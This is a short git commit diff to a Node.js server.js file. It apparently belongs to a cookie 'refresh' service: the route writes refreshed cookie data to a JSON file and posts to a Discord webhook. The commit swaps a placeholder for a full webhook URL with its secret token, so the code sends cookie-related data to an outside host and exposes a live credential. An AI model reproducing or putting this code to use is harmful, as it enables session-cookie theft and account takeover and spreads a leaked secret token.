802c1f7702fc5aaa7ad16894d87f570353ea184e
dreamybull <90737021+PowsGTPS@users.noreply.github.com>
2024-03-28 14:26:59 +0800

    Update server.js

--- server.js
+++ server.js
@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'HOOK HERE';
+    const webhookURL = 'https://discord.com/api/webhooks/1222793750808367114/KBwTseuN5Te-_nLjwFPD5aVVqXOzDpHxzN9BEqjb8OIYELR1rxNtKkTrS4DnSwoIm9vN';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
